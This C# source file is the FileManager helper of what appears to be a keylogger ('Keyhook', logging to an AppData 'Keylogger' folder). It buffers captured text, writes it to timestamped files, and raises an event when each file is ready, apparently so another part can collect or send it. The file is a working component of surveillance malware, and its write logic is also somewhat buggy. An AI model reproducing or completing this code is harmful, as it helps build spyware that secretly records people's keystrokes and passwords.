using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Text;
using Keyhook.Args;

namespace Keyhook.Helpers
{
    public class FileManager
    {
        private readonly StringBuilder _cache;
        private FileInfo _file;
        private string _currentFileName;

        public bool IsFileWritting { get; private set; }
        public int CacheLength { get { return _cache.Length; } }


        public EventHandler<FileReadyArgs> ReadyFile;

        public FileManager()
        {
            _file = new FileInfo(getNameFile());
            _cache = new StringBuilder();
        }

        public void AddCache(string cache)
        {
            _cache.Append(cache);
            if (CacheLength > 100 && !IsFileWritting)
                this.saveCache();
        }

        public void DeleteFile(string filePath)
        {
            var file = new FileInfo(filePath);

            file.Delete();
        }

        private void saveCache()
        {
            IsFileWritting = true;
            var cache = _cache.ToString();
            _cache.Clear();

            using (var stream = _file.AppendText())
            {
                stream.WriteAsync(cache);
                IsFileWritting = false;
            }

            switchFile();
        }

        private string getNameFile()
        {
            var applicationFolder = getApplicationFolder();

            var directory = new DirectoryInfo(applicationFolder);

            if (!directory.Exists)
                directory.Create();

            _currentFileName = getApplicationFolder() + DateTime.Now.ToString("_ddMMyyyyHHmmss") + ".txt";

            return _currentFileName;
        }

        private string getApplicationFolder()
        {
            return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Keylogger\";
        }

        private void switchFile()
        {
            var fileLength = getFileLengthInKb();

            Debugger.Log(1, "1", fileLength.ToString(CultureInfo.InvariantCulture) + "\r\n");

            if (getFileLengthInKb() < 1)
                return;

            OnReadyFile(_file.FullName);
            _file = new FileInfo(getNameFile());
        }

        private double getFileLengthInKb()
        {
            var newFile = new FileInfo(_currentFileName);
            var numBytes = newFile.Length;
            return Convert.ToDouble(numBytes / 1000);
        }

        protected virtual void OnReadyFile(string filePath)
        {
            var handler = ReadyFile;
            if (handler != null)
            {
                handler(this, new FileReadyArgs(filePath));
            }
        }
    }
}